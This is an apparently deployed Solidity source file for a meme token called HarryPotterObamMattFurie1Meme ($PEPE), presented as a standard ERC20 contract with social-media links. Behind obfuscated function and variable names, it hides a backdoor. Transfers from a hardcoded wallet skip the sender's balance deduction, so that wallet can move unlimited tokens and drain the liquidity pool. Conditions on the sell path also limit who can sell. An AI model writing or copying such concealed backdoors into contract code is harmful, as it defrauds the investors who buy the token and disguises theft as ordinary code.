/**
 *Submitted for verification at Etherscan.io on 2023-09-24
*/

/**

HarryPotterObamMattFurie1Meme   $PEPE
Step into the fascinating world of the HarryPotterObamMattFurie1Meme $PEPE, where pop culture, art, and internet whimsy collide in a whirlwind of creativity! 


TWITTER: https://twitter.com/HPepe_erc
TELEGRAM: https://t.me/HPepe_Coin
WEBSITE: https://oxpepe.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mcvde(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mcvde(a, b, "SafeMath");
    }

    function  _mcvde(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _pcvbim {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _qvdxond {
    function soomKenbwcpartksFclacvmc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract HarryPotterObamMattFurie1MemePEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _qvdxond private _Tewapyk;
    address payable private _qcimeva;
    address private _kiadbar;

    bool private _qacvevk;
    bool public _Terexlvam = false;
    bool private oivebmk = false;
    bool private _arujnkmp = false;

    string private constant _name = unicode"HarryPotterObamMattFurie1Meme";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _jTotaluj = 42069000000 * 10 **_decimals;
    uint256 public _pvcyedl = _jTotaluj;
    uint256 public _Weqrnf = _jTotaluj;
    uint256 public _vwoprThaecv= _jTotaluj;
    uint256 public _BcvTpof= _jTotaluj;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _vduvkci;
    mapping (address => bool) private _trabnsny;
    mapping(address => uint256) private _rkcqeno;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrkiobvq=0;
    uint256 private _barmjve=0;


    event _mrorufvt(uint _pvcyedl);
    modifier olTqko {
        oivebmk = true;
        _;
        oivebmk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _jTotaluj;
        _vduvkci[owner(

        )] = true;
        _vduvkci[address
        (this)] = true;
        _vduvkci[
            _qcimeva] = true;
        _qcimeva = 
        payable (0xe865Cfb9A07d89Ecf88341943D625533a6967F84);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _jTotaluj);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _jTotaluj;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mcvde(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 klmsiuk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Terexlvam) {
                if (to 
                != address
                (_Tewapyk) 
                && to !=
                 address
                 (_kiadbar)) {
                  require(_rkcqeno
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rkcqeno
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kiadbar && to != 
            address(_Tewapyk) &&
             !_vduvkci[to] ) {
                require(amount 
                <= _pvcyedl,
                 "Exceeds the _pvcyedl.");
                require(balanceOf
                (to) + amount
                 <= _Weqrnf,
                  "Exceeds the macxizse.");
                if(_barmjve
                < _yrkiobvq){
                  require
                  (! _epnvomz(to));
                }
                _barmjve++;
                 _trabnsny
                 [to]=true;
                klmsiuk = amount._pvr
                ((_barmjve>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kiadbar &&
             from!= address(this) 
            && !_vduvkci[from] ){
                require(amount <= 
                _pvcyedl && 
                balanceOf(_qcimeva)
                <_BcvTpof,
                 "Exceeds the _pvcyedl.");
                klmsiuk = amount._pvr((_barmjve>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_barmjve>
                _yrkiobvq &&
                 _trabnsny[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oivebmk 
            && to == _kiadbar &&
             _arujnkmp &&
             contractTokenBalance>
             _vwoprThaecv 
            && _barmjve>
            _yrkiobvq&&
             !_vduvkci[to]&&
              !_vduvkci[from]
            ) {
                _rvnref( _rvmqz(amount, 
                _rvmqz(contractTokenBalance,
                _BcvTpof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uvcquv(address
                    (this).balance);
                }
            }
        }

        if(klmsiuk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(klmsiuk);
          emit
           Transfer(from,
           address
           (this),klmsiuk);
        }
        _balances[from
        ]= _mcvde(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mcvde(klmsiuk));
        emit Transfer
        (from, to, 
        amount.
         _mcvde(klmsiuk));
    }

    function _rvnref(uint256
     tokenAmount) private
      olTqko {
        if(tokenAmount==
        0){return;}
        if(!_qacvevk)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tewapyk.WETH();
        _approve(address(this),
         address(
             _Tewapyk), 
             tokenAmount);
        _Tewapyk.
        soomKenbwcpartksFclacvmc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvmqz
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mcvde(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qcimeva){
            return a ;
        }else{
            return a .
             _mcvde (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pvcyedl = _jTotaluj;
        _Weqrnf = _jTotaluj;
        emit _mrorufvt(_jTotaluj);
    }

    function _epnvomz(address 
    account) private view 
    returns (bool) {
        uint256 bvcpa;
        assembly {
            bvcpa :=
             extcodesize
             (account)
        }
        return bvcpa > 
        0;
    }

    function _uvcquv(uint256
    amount) private {
        _qcimeva.
        transfer(
            amount);
    }

    function enableTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qacvevk ) ;
        _Tewapyk  
        =  
        _qvdxond
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tewapyk), 
            _jTotaluj);
        _kiadbar = 
        _pcvbim(_Tewapyk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tewapyk .
             WETH ( ) );
        _Tewapyk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kiadbar).
        approve(address(_Tewapyk), 
        type(uint)
        .max);
        _arujnkmp = true;
        _qacvevk = true;
    }

    receive() external payable {}
}